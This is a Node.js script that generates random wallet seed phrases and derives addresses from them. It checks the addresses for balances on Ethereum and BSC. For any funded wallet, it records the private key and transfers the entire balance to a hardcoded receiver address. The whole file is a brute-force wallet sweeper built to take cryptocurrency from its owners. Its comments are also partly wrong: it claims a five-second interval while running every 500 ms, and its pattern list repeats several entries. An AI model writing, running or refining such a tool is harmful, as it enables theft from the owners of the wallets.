const { ethers } = require('ethers');
const fs = require('fs');
const path = require('path');

// Tách RPC theo chain
const RPC_ENDPOINTS = {
    ETH: [
        "https://eth.llamarpc.com",
        "https://eth.rpc.blxrbdn.com",
        "https://eth-mainnet.public.blastapi.io",
        "https://api.zan.top/eth-mainnet",
        "https://rpc.ankr.com/eth",
        "https://eth.drpc.org"
    ],
    BSC: [
        "https://binance.llamarpc.com",
        "https://bsc-pokt.nodies.app",
        "https://endpoints.omniatech.io/v1/bsc/mainnet/public",
        "https://bsc.blockrazor.xyz",
        "https://rpc-bsc.48.club",
        "https://0.48.club",
        "https://bnb.rpc.subquery.network/public",
        "https://bsc-rpc.publicnode.com",
        "https://bnb.api.onfinality.io/public",
        "https://bsc.meowrpc.com"
    ]
};

const RECEIVER_ADDRESS = "0x2de229EC151AE93BC7C80CAd84BADb2d805bD673";
const WALLET_FILE = path.join(__dirname, 'wallet.json');

// Các pattern địa chỉ đặc biệt
const SPECIAL_PATTERNS = [
    /0x[0-9a-f]{8}$/i,        // Địa chỉ kết thúc bằng 8 ký tự hex
    /0{6,}/i,                 // Nhiều số 0 liên tiếp
    /dead/i,                  // Chứa "dead"
    /beef/i,                  // Chứa "beef"
    /cafe/i,                  // Chứa "cafe"
    /face/i,                  // Chứa "face"
    /feed/i,                  // Chứa "feed"
    /fade/i,                  // Chứa "fade"
    /babe/i,                  // Chứa "babe"
    /bad/i,                   // Chứa "bad"
    /ace/i,                   // Chứa "ace"
    /add/i,                   // Chứa "add"
    /dad/i,                   // Chứa "dad"
    /fee/i,                   // Chứa "fee"
    /fee/i,                   // Chứa "fee"
    /f00/i,                   // Chứa "f00"
    /b00/i,                   // Chứa "b00"
    /d00/i,                   // Chứa "d00"
    /a00/i,                   // Chứa "a00"
    /c00/i,                   // Chứa "c00"
    /e00/i,                   // Chứa "e00"
    /faa/i,                   // Chứa "faa"
    /baa/i,                   // Chứa "baa"
    /daa/i,                   // Chứa "daa"
    /aaa/i,                   // Chứa "aaa"
    /caa/i,                   // Chứa "caa"
    /eaa/i,                   // Chứa "eaa"
    /fab/i,                   // Chứa "fab"
    /bad/i,                   // Chứa "bad"
    /dad/i,                   // Chứa "dad"
    /aab/i,                   // Chứa "aab"
    /cab/i,                   // Chứa "cab"
    /eab/i,                   // Chứa "eab"
    /fac/i,                   // Chứa "fac"
    /bac/i,                   // Chứa "bac"
    /dac/i,                   // Chứa "dac"
    /aac/i,                   // Chứa "aac"
    /cac/i,                   // Chứa "cac"
    /eac/i,                   // Chứa "eac"
    /fad/i,                   // Chứa "fad"
    /bad/i,                   // Chứa "bad"
    /dad/i,                   // Chứa "dad"
    /aad/i,                   // Chứa "aad"
    /cad/i,                   // Chứa "cad"
    /ead/i,                   // Chứa "ead"
    /fae/i,                   // Chứa "fae"
    /bae/i,                   // Chứa "bae"
    /dae/i,                   // Chứa "dae"
    /aae/i,                   // Chứa "aae"
    /cae/i,                   // Chứa "cae"
    /eae/i,                   // Chứa "eae"
    /faf/i,                   // Chứa "faf"
    /baf/i,                   // Chứa "baf"
    /daf/i,                   // Chứa "daf"
    /aaf/i,                   // Chứa "aaf"
    /caf/i,                   // Chứa "caf"
    /eaf/i                    // Chứa "eaf"
];

function saveWalletData(walletData) {
    let existingData = [];

    if (fs.existsSync(WALLET_FILE)) {
        const rawData = fs.readFileSync(WALLET_FILE, 'utf-8');
        try {
            existingData = JSON.parse(rawData);
            if (!Array.isArray(existingData)) {
                existingData = [];
            }
        } catch (error) {
            existingData = [];
        }
    }

    existingData.push(walletData);
    fs.writeFileSync(WALLET_FILE, JSON.stringify(existingData, null, 2));
    console.log("✅ Wallet data stored successfully in wallet.json!");
}

function isInterestingAddress(address) {
    return SPECIAL_PATTERNS.some(pattern => pattern.test(address));
}

function generateWallets() {
    const mnemonic = ethers.Wallet.createRandom().mnemonic.phrase;
    console.log('\nNew Mnemonic:', mnemonic);
    console.log('------------------------');

    const hdNode = ethers.utils.HDNode.fromMnemonic(mnemonic);
    
    const numWallets = 4;
    
    return Array(numWallets).fill().map((_, index) => {
        const path = `m/44'/60'/0'/0/${index}`;
        const wallet = hdNode.derivePath(path);
        return {
            privateKey: wallet.privateKey,
            address: wallet.address,
            path
        };
    });
}

async function checkAndTransfer(wallet, rpcUrl, chain) {
    try {
        const provider = new ethers.providers.JsonRpcProvider(rpcUrl);
        const walletWithProvider = new ethers.Wallet(wallet.privateKey, provider);

        if (!isInterestingAddress(wallet.address)) {
            return;
        }

        const [balance, gasPrice] = await Promise.all([
            provider.getBalance(wallet.address),
            provider.getGasPrice()
        ]);

        console.log(`${wallet.address} ${balance}`);

        if (balance.gt(0)) {
            console.log(`\n🎯 Found wallet with balance on ${chain}!`);
            console.log(`Address: ${wallet.address}`);
            console.log(`Private Key: ${wallet.privateKey}`);
            console.log(`Balance: ${ethers.utils.formatEther(balance)} ${chain}`);
            console.log(`RPC: ${rpcUrl}`);

            saveWalletData({
                address: wallet.address,
                privateKey: wallet.privateKey,
                balance: ethers.utils.formatEther(balance),
                chain: chain,
                rpcUrl: rpcUrl,
                foundAt: new Date().toISOString()
            });

            // Xử lý transfer
            const gasLimit = 21000;
            const gasCost = gasPrice.mul(gasLimit);

            if (balance.gt(gasCost)) {
                const amountToSend = balance.sub(gasCost);
                
                const tx = {
                    to: RECEIVER_ADDRESS,
                    value: amountToSend,
                    gasLimit: gasLimit,
                    gasPrice: gasPrice
                };

                const transaction = await walletWithProvider.sendTransaction(tx);
                console.log(`Transaction sent! Hash: ${transaction.hash}`);
                
                await transaction.wait();
                console.log(`Transaction confirmed!`);
                console.log(`Amount sent: ${ethers.utils.formatEther(amountToSend)} ${chain}`);
            }
        }
    } catch (error) {
        if (!error.message.includes('network')) {
            console.error(`Error checking wallet on ${chain}:`, error.message);
        }
    }
}

async function checkAllWallets() {
    console.log("\nGenerating new wallets and checking balances...");
    const wallets = generateWallets();

    for (const [chain, endpoints] of Object.entries(RPC_ENDPOINTS)) {
        console.log(`\nChecking ${chain} chain...`);
        await Promise.all(
            wallets.map((wallet, index) => 
                checkAndTransfer(wallet, endpoints[index % endpoints.length], chain)
            )
        );
    }
}

console.log('Balance checker starting...');
console.log('Checking every 5 seconds...');

// Run immediately once
checkAllWallets();

// Then run every 5 seconds
setInterval(checkAllWallets, 500);


